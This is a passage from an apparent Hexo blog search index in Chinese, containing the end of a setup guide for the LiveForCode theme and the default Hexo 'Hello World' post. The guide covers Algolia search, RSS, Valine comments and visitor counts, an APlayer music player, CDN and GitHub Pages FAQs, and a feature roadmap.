Algolia。前往站点根目录，执行命令安装：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">--save</span> hexo-algolia<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.编辑 <strong>站点配置文件</strong> ，新增以下配置：  </p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">algolia</span><span class="token punctuation">:</span>  <span class="token key atrule">applicationID</span><span class="token punctuation">:</span> <span class="token string">'applicationID'</span>  <span class="token key atrule">apiKey</span><span class="token punctuation">:</span> <span class="token string">'apiKey'</span>  <span class="token key atrule">indexName</span><span class="token punctuation">:</span> <span class="token string">'...'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注：这里的 applicationID 为 <code>Search-Only API Key</code><br>4.当配置完成，在站点根目录下执行一下命令更新 Index。请注意观察命令的输出。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">HEXO_ALGOLIA_INDEXING_KEY</span><span class="token operator">=</span>Admin API Keyhexo algolia<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5.Hexo Algolia 命令设置选项  </p><pre class="line-numbers language-none"><code class="language-none">Options:  --dry-run       Does not push content to Algolia (default: false).  --flush         Resets the Algolia index before starting the indexation (default: false).  --indexing-key  An algolia API key with add&#x2F;delete records permissions.              It should be different than the search-only API key configured in _config.yml.  --layouts       A comma-separated list of page layouts to index (default: &quot;page&quot;).<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明：<br><code>--flush</code> 如果是 <code>false</code> 则每一次都会直接添加内容到 Algolia 相关的 Index 中，如果不是第一次提交，则将其设置为 <code>true</code><br><code>--layouts</code> 如果使用默认设置，提交的时候会将分类归档、标签归档、赞赏、留言板等页面内容提交到 Algolia， 在搜索的时候，将会搜索到分类归档、标签归档、赞赏、留言板等页面内容，建议使用时将其设置为 <code>post</code>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo algolia <span class="token parameter variable">--flush</span> <span class="token boolean">true</span> <span class="token parameter variable">--layouts</span> post<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置-RSS"><a href="#设置-RSS" class="headerlink" title="设置 RSS"></a>设置 RSS</h3><p>1.安装 <code>Hexo-Feed</code> 插件。前往站点根目录，执行命令安装：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">--save</span> hexo-generator-feed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.根据个人需求，编辑 <strong>站点配置文件</strong> ：  </p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">feed</span><span class="token punctuation">:</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> atom  <span class="token key atrule">path</span><span class="token punctuation">:</span> atom.xml  <span class="token key atrule">limit</span><span class="token punctuation">:</span> <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文章数据统计"><a href="#文章数据统计" class="headerlink" title="文章数据统计"></a>文章数据统计</h3><p>文章数据统计基于 <code>Valine.js</code> 插件实现。<br>实现方式：在文章列表页面加载 <code>Valine.js</code>， 只要 Valine 配置项中的 <code>el</code> 元素不存在即不会加载评论框相关内容。  </p><p>1.文章评论数统计<br>Valine 会自动查找页面中 class 值为 <code>valine-comment-count</code> 的元素，获取其 <code>data-xid</code> 为查询条件。并将得到的值填充到其 class 的值为 <code>valine-comment-count</code> 的元素里：  </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- data-xid 将作为查询条件 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>valine-comment-count<span class="token punctuation">"</span></span> <span class="token attr-name">data-xid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;Your/Path/Name><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.文章阅读量统计<br>Valine 从 <code>v1.2.0</code> 开始支持文章阅读量统计。  </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Valine</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#vcomments'</span><span class="token punctuation">,</span>    <span class="token operator">...</span>    <span class="token literal-property property">visitor</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token comment">// 阅读量统计</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果开启了阅读量统计，Valine 会自动检测 LeanCloud 应用中是否存在 <code>Counter</code> 类，如果不存在会自动创建，无需手动创建。<br>Valine 会自动查找页面中 class 值为 <code>leancloud_visitors</code> 的元素，获取其 <code>id</code> 为查询条件。并将得到的值填充到其 class 的值为 <code>leancloud-visitors-count</code> 的子元素里：  </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- id 将作为查询条件 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;Your/Path/Name><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>leancloud_visitors<span class="token punctuation">"</span></span> <span class="token attr-name">data-flag-title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Your Article Title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>leancloud-visitors-count<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="评论列表"><a href="#评论列表" class="headerlink" title="评论列表"></a>评论列表</h3><p>评论功能使用的是 <code>Valine.js</code> 插件，配置详情请参见 <a href="https://valine.js.org/">Valine</a>。  </p><blockquote><p>特别说明 <strong>主题配置文件</strong> 中的 Valine 的 <code>appId</code> 与 <code>appKey</code> 请大家自行配置自己的参数。如果评论数据提交到我的 LeanCloud 工作空间，我并不能保证数据的完整性。  </p></blockquote><h3 id="赞赏页面"><a href="#赞赏页面" class="headerlink" title="赞赏页面"></a>赞赏页面</h3><p>赞赏页面使用了 <a href="https://github.com/Kaiyuan/sponsor-page">Sponsor Page</a>，并做了相关修改使其适应博客样式。感兴趣的小伙伴自行去了解吧。  </p><h3 id="音乐播放器"><a href="#音乐播放器" class="headerlink" title="音乐播放器"></a>音乐播放器</h3><p>音乐播放器功能是使用 <code>APlayer.js</code> 以及 <code>Meting.js</code> 实现，配置详情参见 <a href="https://aplayer.js.org/#/home">APlayer</a>、<a href="https://github.com/metowolf/MetingJS">Meting</a>。<br>主题中有两种实现方式，一种是 <code>APlayer.js</code> 结合 <code>Meting.js</code> 的实现方式，另外一种是 <code>APlayer.js</code> 单独的实现方式，两种实现方式各有优缺点：<br>第一种实现方式配置简单，并且可以从各个音乐平台解析音乐。由于是从各个平台解析，故而不是特别稳定，并且在 <code>IE</code> 浏览器中需要特殊设置。<br>第二种实现方式配置相对复杂，需要单独提供音乐相关信息，但是十分稳定，且对于 <code>IE</code> 浏览器也可兼容，无需特殊配置。<br>主题中默认以 <strong>第一种实现方式</strong> 实现，第二种实现方式为备选方案，在第一种实现方式出现问题的时候，可以切换到第二种实现方式，保证网站的稳定运行。<br>针对第二种实现方式需要 <strong>注意</strong> 的地方：<br><code>APlayer.js</code> 是基于 <code>HTML 5 Audio</code> 实现的一款音乐播放器插件，故而支持的音频格式有限，包括：<code>MP3</code>、<code>Wav</code> 以及 <code>Ogg</code> 格式，并且不同浏览器对这三种音频格式的支持也各有不同，详细信息大家参考 <a href="https://www.runoob.com/html/html5-audio.html">HTML5 Audio(音频)</a>。如果音频格式不支持，可以通过音频转换工具进行格式转换。<br><code>APlayer.js</code> 是通过 <code>XMLHttpRequest</code> 获取歌词文件，所以存在 <strong>跨域</strong> 问题。可以考虑将歌词文件放在主题文件夹 <code>LiveForCode</code> 的 <code>source</code> 文件夹下（ <strong>注意</strong> ：这里的 <code>source</code> 文件夹不是 <code>Hexo</code> 站点目录下的 <code>source</code> 文件夹），解决跨域的问题。由于 <code>jsDelivr</code> 在响应请求的时候，会添加 <code>access-control-allow-origin: *</code> 的响应标头信息，故而不存在跨域问题，也可以使用这种方式。不过需要注意的是，<code>jsDelivr</code> 对资源的大小有所限制，不可以超过 <strong>50M</strong> 。<br><code>APlayer.js</code> 获取到歌词后会将歌词中的空白行去掉，由于是单行显示歌词，所以有译文的双行歌词，只会显示下面一行歌词，可以将译文歌词拼接在歌词原文的后面解决这个问题。  </p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="关于-jQuery-版本"><a href="#关于-jQuery-版本" class="headerlink" title="关于 jQuery 版本"></a>关于 jQuery 版本</h3><p>mCustomScroll 目前暂不支持 <code>jQuery3.5</code> 以及以上版本，否则会导致代码块中的滚动条失效。  </p><h3 id="Position-fixed-定位问题"><a href="#Position-fixed-定位问题" class="headerlink" title="Position: fixed 定位问题"></a>Position: fixed 定位问题</h3><p>由于背景动画的 <code>z-index</code> 为 <code>-1</code>，导致在IE浏览器中，菜单等多处 <code>position: fixed</code> 样式的部件出现闪烁抖动的问题，所以默认在IE浏览器中关闭了背景动画。如果是高版本IE，例如IE11则可在设置 -&gt; Internet选项 -&gt; 高级，将浏览中的’使用平滑滚动’选项勾掉，也可以解决这个问题。  </p><h3 id="关于-Github-Page-的使用"><a href="#关于-Github-Page-的使用" class="headerlink" title="关于 Github Page 的使用"></a>关于 Github Page 的使用</h3><p>详情请参见 <a href="https://hexo.io/zh-cn/docs/github-pages">将 Hexo 部署到 GitHub Pages</a>。<br>Github Page 支持设置自己的域名，建议在 Hexo 主题的 source 文件夹下新增一个 CNAME 的文件，将自己的域名配置进去，否则每次提交的时候会覆盖掉相关域名设置。<br>在域名的解析设置中，可以使用 CNAME 解析方式，也可以使用 A记录 的方式。如果是 A记录 的方式，则需要检索当前 Github Page 对应的服务器 IP 地址。  </p><h3 id="关于-CDN"><a href="#关于-CDN" class="headerlink" title="关于 CDN"></a>关于 CDN</h3><p>CDN 可以在阿里云购买相关的 CDN 服务器，效果肯定是更好，这里使用的是 <a href="https://www.jsdelivr.com/">jsDelivr</a> 免费的 CDN 加速服务。但是有一个弊端，如果修改代码的时候没有Github的相关版本信息，则很容易读取到 jsDelivr 的缓存数据，而不是修改后的最新代码。至于这个缓存时间，我也拿捏不准。不过免费而且效果不错的东西，大家就不要要求太多了。  </p><h2 id="阶段计划"><a href="#阶段计划" class="headerlink" title="阶段计划"></a>阶段计划</h2><p>1.使用 Vue.js 重构项目<br>2.整理模板的样式文件<br>3.加入 Pjax，优化页面加载速度<br>4.补充国际化支持语言<br>5.考虑是否加入黑夜模式  </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由于我还是一名小白，可能还有很多问题无法解决，这个主题也可能存在很多不尽如人意的地方，在细节方面我也会尽力地去修改，也欢迎大家提出自己的问题，以及主题的相关建议，也欢迎大家提交代码。如果觉得这个主题不错，欢迎大家去使用。当然了，如果能赞赏我一下，我也是不介意的。(●ˇ∀ˇ●)  </p><p>这个主题可定制的地方目前可能比较少，欢迎大家修改，也希望这个主题能够越来越好看，也希望越来越多的人能够喜欢。  </p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/01/01/helloworld/"/>
      <url>/2020/01/01/helloworld/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
